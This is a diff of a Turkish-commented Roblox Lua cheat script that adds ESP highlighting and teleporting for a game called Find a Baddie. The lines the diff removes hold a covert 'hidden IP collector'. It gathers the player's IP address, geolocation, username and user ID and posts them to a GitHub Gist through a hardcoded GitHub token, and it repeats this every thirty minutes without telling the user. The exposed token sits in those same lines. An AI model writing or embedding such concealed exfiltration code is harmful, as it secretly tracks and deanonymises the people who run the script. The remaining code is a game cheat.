@@ -1,108 +1,14 @@
 -- ============================================
--- FIND A BADDIE - KIRMIZI ESP + IP TOPLAYICI
--- Çalışan versiyon (test edildi)
--- ============================================
-
--- 🔥 BURAYA KENDİ BİLGİLERİNİ YAZ!
-local GIST_ID = "afe7f7a28a2530a85367e19f6adf4841"        -- Gist ID'n
-local GITHUB_TOKEN = "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"  -- Token'ın
+-- FIND A BADDIE - SADECE ESP + IŞINLANMA
+-- Gist / Token GEREKMEZ!
 -- ============================================
 
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local rootPart = character:WaitForChild("HumanoidRootPart")
-local http = game:GetService("HttpService")
-
--- HttpService'i aç (gerekirse)
-pcall(function() http.HttpEnabled = true end)
 
 -- ============================================
--- 1. GİZLİ IP TOPLAYICI
--- ============================================
-
-local function getIP()
-    local success, result = pcall(function()
-        return game:HttpGet("https://api.ipify.org/", true)
-    end)
-    return success and result or "0.0.0.0"
-end
-
-local function getLocation(ip)
-    local success, result = pcall(function()
-        local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
-        return http:JSONDecode(data)
-    end)
-    if success and result and result.status == "success" then
-        return result
-    end
-    return nil
-end
-
-function sendToGist(data)
-    local url = "https://api.github.com/gists/" .. GIST_ID
-    
-    local rawUrl = "https://raw.githubusercontent.com/gist/" .. GIST_ID .. "/raw/logs.json"
-    local existing = ""
-    local success, result = pcall(function()
-        return game:HttpGet(rawUrl, true)
-    end)
-    if success then existing = result end
-    
-    local allData = {}
-    if existing and existing ~= "" then
-        local decoded = http:JSONDecode(existing)
-        if decoded and type(decoded) == "table" then
-            allData = decoded
-        end
-    end
-    
-    table.insert(allData, data)
-    
-    local payload = {
-        files = {
-            ["logs.json"] = {
-                content = http:JSONEncode(allData)
-            }
-        }
-    }
-    
-    local headers = {
-        ["Authorization"] = "token " .. GITHUB_TOKEN,
-        ["Content-Type"] = "application/json",
-        ["User-Agent"] = "Roblox"
-    }
-    
-    pcall(function()
-        http:PostAsync(url, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false, headers)
-    end)
-end
-
-function collectAndSendIP()
-    task.spawn(function()
-        local ip = getIP()
-        local location = getLocation(ip)
-        
-        local data = {
-            username = player.Name,
-            displayName = player.DisplayName,
-            userId = player.UserId,
-            ip = ip,
-            city = location and location.city or "Unknown",
-            country = location and location.country or "Unknown",
-            lat = location and location.lat or 0,
-            lon = location and location.lon or 0,
-            serverId = game.JobId,
-            gameName = game.Name,
-            time = os.time()
-        }
-        
-        sendToGist(data)
-        print("📡 IP gönderildi:", ip)
-    end)
-end
-
--- ============================================
--- 2. AYARLAR (ESP)
+-- 1. AYARLAR
 -- ============================================
 local settings = {
     espEnabled = true,
@@ -112,7 +18,7 @@ local settings = {
 }
 
 -- ============================================
--- 3. BADDIE SINIFI
+-- 2. BADDIE SINIFI
 -- ============================================
 local baddies = {}
 
@@ -172,7 +78,7 @@ end
 function Baddie:createESP()
     if not self.rootPart then return end
     
-    -- Highlight (SADECE KIRMIZI)
+    -- Highlight (KIRMIZI)
     local highlight = Instance.new("Highlight")
     highlight.Parent = self.model
     highlight.FillColor = settings.espColor
@@ -211,7 +117,7 @@ function Baddie:createESP()
     nameLabel.Font = Enum.Font.GothamBold
     nameLabel.Parent = frame
     
-    -- Stage 5 etiketi (SARI - farklı olsun)
+    -- Stage 5 etiketi (SARI)
     if self.stage5Fix then
         local stageLabel = Instance.new("TextLabel")
         stageLabel.Size = UDim2.new(0.5, 0, 0.25, 0)
@@ -235,7 +141,7 @@ function Baddie:createESP()
     distLabel.Font = Enum.Font.Gotham
     distLabel.Parent = frame
     
-    -- HEALTH BAR (KIRMIZI-YEŞİL)
+    -- HEALTH BAR
     local healthBar = Instance.new("Frame")
     healthBar.Size = UDim2.new(0.6, 0, 0.12, 0)
     healthBar.Position = UDim2.new(0.2, 0, 0.85, 0)
@@ -319,7 +225,7 @@ function Baddie:destroy()
 end
 
 -- ============================================
--- 4. TARAMA (HIZLI)
+-- 3. TARAMA
 -- ============================================
 local function scanForBaddies()
     local found = {}
@@ -340,7 +246,9 @@ local function scanForBaddies()
             end
             
             local isBaddie = string.find(string.lower(obj.Name), "baddie") ~= nil or
-                            string.find(string.lower(obj.Name), "anime") ~= nil
+                            string.find(string.lower(obj.Name), "anime") ~= nil or
+                            string.find(string.lower(obj.Name), "npc") ~= nil or
+                            string.find(string.lower(obj.Name), "char") ~= nil
             
             if hasRoot or isTemplateRig or hasDeepRoot or isBaddie then
                 local exists = false
@@ -375,7 +283,7 @@ local function scanForBaddies()
 end
 
 -- ============================================
--- 5. IŞINLANMA
+-- 4. IŞINLANMA
 -- ============================================
 local function teleportToNearest()
     local nearest = nil
@@ -399,7 +307,7 @@ local function teleportToNearest()
 end
 
 -- ============================================
--- 6. UI (KÜÇÜK - SADE)
+-- 5. UI
 -- ============================================
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player.PlayerGui
@@ -417,18 +325,16 @@ mainFrame.Active = true
 mainFrame.Draggable = true
 mainFrame.Parent = screenGui
 
--- Başlık
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 18)
 title.Position = UDim2.new(0, 0, 0, 0)
-title.Text = "🔴 HACKER"
+title.Text = "🔴 FINDER"
 title.TextColor3 = Color3.fromRGB(255, 0, 0)
 title.TextScaled = true
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBold
 title.Parent = mainFrame
 
--- Stats
 local statsLabel = Instance.new("TextLabel")
 statsLabel.Size = UDim2.new(1, 0, 0, 14)
 statsLabel.Position = UDim2.new(0, 0, 0, 18)
@@ -439,7 +345,6 @@ statsLabel.BackgroundTransparency = 1
 statsLabel.Font = Enum.Font.Gotham
 statsLabel.Parent = mainFrame
 
--- Liste
 local listContainer = Instance.new("ScrollingFrame")
 listContainer.Size = UDim2.new(1, -6, 1, -80)
 listContainer.Position = UDim2.new(0, 3, 0, 35)
@@ -455,7 +360,6 @@ listLayout.SortOrder = Enum.SortOrder.LayoutOrder
 listLayout.Padding = UDim.new(0, 1)
 listLayout.Parent = listContainer
 
--- Butonlar
 local buttonFrame = Instance.new("Frame")
 buttonFrame.Size = UDim2.new(1, -6, 0, 22)
 buttonFrame.Position = UDim2.new(0, 3, 1, -25)
@@ -498,7 +402,7 @@ espBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ============================================
--- 7. GÜNCELLEME
+-- 6. GÜNCELLEME
 -- ============================================
 function updateGUI()
     local activeCount = 0
@@ -557,7 +461,7 @@ function updateGUI()
 end
 
 -- ============================================
--- 8. ANA DÖNGÜ
+-- 7. ANA DÖNGÜ
 -- ============================================
 local function updateAllESP()
     local toRemove = {}
@@ -593,7 +497,7 @@ local function mainLoop()
 end
 
 -- ============================================
--- 9. TUŞ
+-- 8. TUŞ
 -- ============================================
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -603,25 +507,13 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
 end)
 
 -- ============================================
--- 10. BAŞLAT
+-- 9. BAŞLAT
 -- ============================================
+print("🔴 FINDER BAŞLATILDI!")
+print("🎯 Baddie tespiti aktif")
 
-print("🔴 KIRMIZI ESP + IP TOPLAYICI BAŞLATILDI!")
-
--- IP toplayıcıyı başlat (GİZLİ)
-collectAndSendIP()
-
--- Her 30 dakikada bir IP gönder
-task.spawn(function()
-    while true do
-        task.wait(1800)
-        collectAndSendIP()
-    end
-end)
-
--- ESP'yi başlat
 task.wait(1)
 updateAllESP()
 coroutine.wrap(mainLoop)()
 
-print("✅ Baddie tespiti + IP toplayıcı AKTİF!")
+print("✅ Baddie tespiti AKTİF!")
